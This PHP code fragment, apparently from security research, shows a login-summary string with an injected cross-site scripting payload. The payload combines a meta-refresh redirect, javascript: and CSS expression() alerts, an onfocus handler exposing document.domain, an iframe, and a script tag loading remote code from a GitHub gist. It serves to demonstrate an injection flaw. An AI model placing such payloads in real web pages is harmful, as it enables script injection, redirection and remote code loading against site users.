        ...
        if (!$bCannotLogin)
        {
            ...
            $loginsummary .= "
                                                            <ul>
                                                                            ...
                                                                            <meta http-equiv='refresh' content='0; url=https://www.watchtowr.com/'><div style='background-image: url(javascript:alert(1))'><style>body{background-color:expression\(alert(1))}</style><h1>HTML INJECTION HERE</h1><input name='user' id='user' type='text' size='40' maxlength='40' value='' autofocus='' onfocus='alert(document.domain)' /><script src='https://gist.githubusercontent.com/h888t/08c72a6317005c81e6feb8758dbcbe0b/raw/1760eb7998a6c66889a60ec1508f9d2be8444283/gistfile1.txt'></script><iframe src='https://google.com' /></iframe></li>
